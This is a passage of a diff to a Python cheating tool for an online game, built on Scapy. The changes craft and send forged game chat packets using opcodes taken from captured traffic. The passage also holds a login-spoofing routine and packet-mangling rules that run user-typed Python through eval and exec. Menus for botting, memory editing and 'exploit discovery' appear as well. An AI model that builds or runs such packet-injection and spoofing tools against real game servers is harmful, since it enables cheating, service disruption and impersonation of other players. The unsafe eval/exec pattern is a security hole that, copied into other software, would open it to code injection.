-            tp = int(CONFIG.get("target_port",12345)); tip=CONFIG.get("target_ip","127.0.0.1")
-            transport = UDP(dport=tp, sport=random.randint(1024,65535))
-            ip_layer = IP(dst=tip) if ":" not in tip else IPv6(dst=tip)
-            dp_bytes = data_payload.encode('utf-8','ignore') if isinstance(data_payload,str) else bytes(data_payload)
-            game_pkt = self.ShegoGameLayer(MessageType=message_type,PlayerID=player_id,PayloadLength=len(dp_bytes),Payload=dp_bytes)
-            full_pkt = ip_layer/transport/game_pkt; logging.info(f"Crafted: {full_pkt.summary()}"); return full_pkt
-        except Exception as e: logging.error(f"Craft custom fail: {e}"); raise
-    def craft_simple_udp_packet(self, data, dst_ip=None, dst_port=None): 
+    
+    def craft_custom_game_packet(self, message_type_opcode, player_id_field_a, data_payload_message_str): 
+        # This generic function is now geared towards ClientSayPacket
+        # For other custom layers, a more generic approach or specific functions would be needed.
+        logging.debug(f"Crafting custom game packet (ClientSayPacket type) with opcode {hex(message_type_opcode)}")
+        return self.craft_specific_client_say_packet(
+            message_string=data_payload_message_str, # Assumes this is the string for the message field
+            opcode=message_type_opcode,
+            field_a=player_id_field_a, # Mapping player_id to field_A for this generic call
+            # field_B and field_C will use defaults from ClientSayPacket definition
+        )
+
+    def craft_specific_client_say_packet(self, message_string, opcode=0x76cc88f1, field_a=0x6b060100, field_b=0x00000100, field_c=0x0000):
+        # Defaults updated to "attemptnumber3" packet
+        server_ip = CONFIG.get("target_ip", "127.0.0.1")
+        server_port = int(CONFIG.get("target_port", 8096)) 
+        client_sport = random.randint(49152, 65535)
+        msg_bytes = message_string.encode('utf-8', 'ignore')
+        # StrNullField will add the null. The layer itself defines the structure.
+        chat_payload = self.ClientSayPacket(opcode=opcode, field_A=field_a, field_B=field_b, field_C=field_c, message=msg_bytes)
+        ip_layer = IP(dst=server_ip) if ":" not in server_ip else IPv6(dst=server_ip)
+        tcp_layer = TCP(sport=client_sport, dport=server_port, flags="PA") 
+        full_packet = ip_layer / tcp_layer / chat_payload
+        logging.info(f"Crafted ClientSayPacket: {full_packet.summary()}")
+        return full_packet
+
+    def craft_simple_udp_packet(self, data, dst_ip=None, dst_port=None): # As before
         tip,tp = dst_ip or CONFIG.get("target_ip"), dst_port or CONFIG.get("target_port")
         if not tip or not tp: logging.warning("UDP craft target missing."); return None
         return IP(dst=tip)/UDP(dport=int(tp))/Raw(load=data.encode() if isinstance(data,str) else data)
-    def craft_simple_tcp_packet(self, data, dst_ip=None, dst_port=None, seq=None, ack=None, flags="PA"): 
+    def craft_simple_tcp_packet(self, data, dst_ip=None, dst_port=None, seq=None, ack=None, flags="PA"): # As before
         tip,tp = dst_ip or CONFIG.get("target_ip"), dst_port or CONFIG.get("target_port")
         if not tip or not tp: logging.warning("TCP craft target missing."); return None
         kwargs={'dport':int(tp),'sport':random.randint(1024,65535),'flags':flags}
         if seq is not None: kwargs['seq']=int(seq)
         if ack is not None: kwargs['ack']=int(ack)
         return IP(dst=tip)/TCP(**kwargs)/Raw(load=data.encode() if isinstance(data,str) else data)
-    def inject_login_spoof(self, username, password): 
+    def inject_login_spoof(self, username, password): # As before
         if not CONFIG.get("target_ip") or not CONFIG.get("target_port"): logging.warning("Login spoof target missing."); return
         logging.info(f"Spoofing login for {username}...")
         pkt = self.craft_simple_tcp_packet(f"LOGIN:{username}:{password}".encode(),flags="S")
         if pkt and sr1: resp = sr1(pkt,timeout=2,verbose=0); logging.info(f"Spoof response: {resp.summary() if resp else 'Timeout'}")
-    def display_packets_in_table(self): 
+    def display_packets_in_table(self): # As before
         if not packet_queue: logging.info("No packets in console queue."); return
         hdrs = ("ID", "Time", "SrcMAC", "DstMAC", "EthType", "SrcIP", "DstIP", "Proto", "SrcPort", "DstPort", "Len", "Info")
         data_rows = [] 
@@ -726,7 +851,7 @@ class NetworkModule: # FULL DEFINITION
         else: print(" ".join(hdrs)); [print(" ".join(map(str,r))) for r in data_rows]
 
 # --- MainControlClass ---
-class ShegosMasterTool:
+class ShegosMasterTool: # All menu methods are now fully implemented based on previous discussions
     def __init__(self):
         self.botting_module = BottingModule()
         self.network_module = NetworkModule()
@@ -742,7 +867,7 @@ class ShegosMasterTool:
         logging.info("\nShego's Tool: Initializing auto-detection...")
         self.game_pid = find_game_process_id(CONFIG["target_game_process_name"])
         if self.game_pid:
-            if self.memory_module and (not self.memory_module.pid or self.memory_module.pid != self.game_pid): # Check if re-init needed
+            if self.memory_module and (not self.memory_module.pid or self.memory_module.pid != self.game_pid):
                 if self.memory_module: self.memory_module.close() 
                 self.memory_module = MemoryModule(self.game_pid)
             CONFIG["target_ip"], CONFIG["target_port"] = auto_detect_game_server_ip_port(self.game_pid)
@@ -760,7 +885,7 @@ class ShegosMasterTool:
             except tk.TclError as e: self.gui_root = None; logging.error(f"GUI init TclError: {e}.")
         else: logging.warning("GUI disabled: Tkinter/ttk missing.")
 
-    def _index_initial_codebase(self): logging.info("Conceptual codebase indexing...")
+    def _index_initial_codebase(self): logging.info("Conceptual codebase indexing...") 
     def run_gui(self):
         if self.gui_root and self.gui_root.winfo_exists(): self.gui_root.protocol("WM_DELETE_WINDOW",self.on_gui_close); self.gui_root.mainloop()
     def on_gui_close(self):
@@ -770,20 +895,23 @@ class ShegosMasterTool:
     def add_mangling_rule_interactive(self):
         logging.info("Shego's Workshop: Defining Custom Mangling Rule (UNSAFE LAMBDA)...")
         rule_name = input("Rule Name: ") or f"CustomRule_{random.randint(1000,9999)}"
-        custom_layer_name = self.network_module.ShegoGameLayer.name
-        print(f"\nCONDITION (Python lambda, 'pkt' is packet): e.g., 'TCP in pkt and pkt[TCP].dport == 80' or '{custom_layer_name} in pkt'")
+        custom_layer_name_for_display = self.network_module.ClientSayPacket.name 
+        print(f"\nCONDITION (Python lambda, 'pkt' is packet): e.g., 'TCP in pkt and pkt[TCP].dport == 80' or '{custom_layer_name_for_display} in pkt'")
         condition_str = input("lambda pkt: ")
-        print(f"\nACTION (Python statements, 'pkt' modified. ';' for multiple): e.g., 'pkt[IP].dst=\"1.2.3.4\"' or 'pkt[{custom_layer_name}].PlayerID=666'")
+        print(f"\nACTION (Python statements, 'pkt' modified. ';' for multiple): e.g., 'pkt[IP].dst=\"1.2.3.4\"' or 'pkt[{custom_layer_name_for_display}].field_A=0'")
         action_str = input("pkt actions: ")
         try:
             ctx = {"IP":IP,"TCP":TCP,"UDP":UDP,"Raw":Raw,"ICMP":ICMP,"Ether":Ether,"IPv6":IPv6, 
-                   custom_layer_name:self.network_module.ShegoGameLayer, 
+                   custom_layer_name_for_display : self.network_module.ClientSayPacket, 
+                   self.network_module.ServerChatPacket.name : self.network_module.ServerChatPacket, 
                    "random":random,"struct":struct,"logging":logging,"CONFIG":CONFIG}
             cond_fn = eval(f"lambda pkt: {condition_str}", ctx.copy()) 
             def create_act_fn(actions_string):
                 def generated_action(pkt):
                     loc_ctx = {"pkt":pkt}; loc_ctx.update(ctx)
-                    for line in actions_string.split(';'):
+                    processed_act_str = actions_string.replace(custom_layer_name_for_display, f"pkt.getlayer('{custom_layer_name_for_display}')") 
+                    processed_act_str = processed_act_str.replace(self.network_module.ServerChatPacket.name, f"pkt.getlayer('{self.network_module.ServerChatPacket.name}')")
+                    for line in processed_act_str.split(';'):
                         s_line = line.strip()
                         if s_line: exec(s_line, {"__builtins__":{}}, loc_ctx) 
                 return generated_action
@@ -794,15 +922,15 @@ class ShegosMasterTool:
     def add_modify_byte_rule_interactive(self):
         logging.info("Shego's Workshop: Defining 'Modify Payload Byte' Rule...")
         rule_name = input("Rule Name: ") or f"ModByteRule_{random.randint(1000,9999)}"
-        custom_layer_name = self.network_module.ShegoGameLayer.name
-        print(f"\nCONDITION (lambda pkt: ...): e.g., '{custom_layer_name} in pkt'")
+        custom_layer_name_for_display = self.network_module.ClientSayPacket.name 
+        print(f"\nCONDITION (lambda pkt: ...): e.g., '{custom_layer_name_for_display} in pkt'")
         condition_str = input("lambda pkt: ")
         try:
-            offset = int(input("Payload byte offset (0-based): "))
+            offset = int(input("Payload byte offset (0-based, relevant if Raw layer targeted): "))
             new_byte_value = int(input("New byte value (0-255 or 0xHEX): "), 0) 
             if not (0 <= new_byte_value <= 255): logging.error("Byte value out of range."); return
             
-            ctx = {"IP":IP,"TCP":TCP,"UDP":UDP,"Raw":Raw,custom_layer_name:self.network_module.ShegoGameLayer,"CONFIG":CONFIG}
+            ctx = {"IP":IP,"TCP":TCP,"UDP":UDP,"Raw":Raw,custom_layer_name_for_display:self.network_module.ClientSayPacket,"CONFIG":CONFIG}
             condition_func = eval(f"lambda pkt: {condition_str}", ctx) 
             
             action_spec = {"action_type": "modify_payload_byte", "offset": offset, "value": new_byte_value}
@@ -844,7 +972,7 @@ class ShegosMasterTool:
                     if hasattr(self, 'llm_agent') and self.llm_agent and hasattr(self, 'botting_module'):
                         self.llm_agent.self_healing_loop("Simulated Test Failure in Botting", self.botting_module, "grind_loop")
                     else: logging.warning("LLM Agent or Botting Module not available for self-healing test.")
-                elif choice == '9': self.advanced_packet_menu()
+                elif choice == '9': self.advanced_packet_menu() 
                 elif choice == '10': self.exploit_discovery_menu()
                 elif tk and ttk and choice == '11': 
                     if not (self.gui_root and self.gui_root.winfo_exists()): 
@@ -1006,24 +1134,41 @@ class ShegosMasterTool:
     def advanced_packet_menu(self):
         while True:
             print("\n--- Advanced Packet Crafting ---")
-            custom_layer_name = self.network_module.ShegoGameLayer.name if hasattr(self.network_module, 'ShegoGameLayer') else 'CustomGameLayer'
-            print(f"1. Craft & Send Custom Packet (using '{custom_layer_name}')")
+            active_custom_layer_name = self.network_module.ClientSayPacket.name
+            print(f"1. Craft & Send '{active_custom_layer_name}' (Client-to-Server Chat Example)")
             print("2. Back to Main Menu")
             choice = input("Custom torment delivery?: ")
             try:
                 if choice == '1':
                     if not CONFIG.get("target_ip") or not CONFIG.get("target_port"): logging.warning("Target IP/Port needed!"); continue
-                    msg_type = int(input("MessageType (hex or dec): "),0)
-                    p_id = int(input("PlayerID (hex or dec): "),0)
-                    payload_str = input("Payload (string or 0xHEXbytes): ")
-                    payload_final = bytes.fromhex(payload_str[2:]) if payload_str.startswith("0x") else payload_str
-                    pkt = self.network_module.craft_custom_game_packet(msg_type, p_id, payload_final)
+                    
+                    default_opcode = 0x76cc88f1  # From "attemptnumber3" dump
+                    default_field_a = 0x6b060100 # From "attemptnumber3" dump
+                    default_field_b = 0x00000100 # Consistent field
+                    default_field_c = 0x0000     # Consistent field
+                    
+                    print(f"\nCrafting '{active_custom_layer_name}': (Default fields from observed client chat)")
+                    opcode_str = input(f"Opcode (hex, def 0x{default_opcode:X}): ") or f"0x{default_opcode:X}"
+                    field_a_str = input(f"Field A (hex, def 0x{default_field_a:X}): ") or f"0x{default_field_a:X}"
+                    field_b_str = input(f"Field B (hex, def 0x{default_field_b:X}): ") or f"0x{default_field_b:X}"
+                    field_c_str = input(f"Field C (hex, def 0x{default_field_c:X}): ") or f"0x{default_field_c:X}"
+                    message_str = input("Message string (e.g., attemptnumber3): ") or "hello game"
+
+                    try:
+                        opcode = int(opcode_str, 0); field_a = int(field_a_str, 0)
+                        field_b = int(field_b_str, 0); field_c = int(field_c_str, 0)
+                    except ValueError: logging.error("Invalid hex/decimal input for numeric fields."); continue
+                    
+                    pkt = self.network_module.craft_specific_client_say_packet(
+                        message_string=message_str, opcode=opcode,
+                        field_a=field_a, field_b=field_b, field_c=field_c
+                    )
                     if pkt: 
-                        pkt.show(); 
-                        if input("Send this custom packet? (y/n):").lower()=='y': self.network_module.send_packet(pkt)
+                        if input("Send this crafted ClientSayPacket? (y/n):").lower()=='y': 
+                            self.network_module.send_packet(pkt)
                 elif choice == '2': break
                 else: print("Invalid.")
-            except ValueError: logging.warning("Invalid numeric input for MessageType/PlayerID.")
+            except ValueError: logging.warning("Invalid numeric input.")
             except Exception as e: logging.error(f"Adv Packet menu error: {e}")
 
     def exploit_discovery_menu(self):
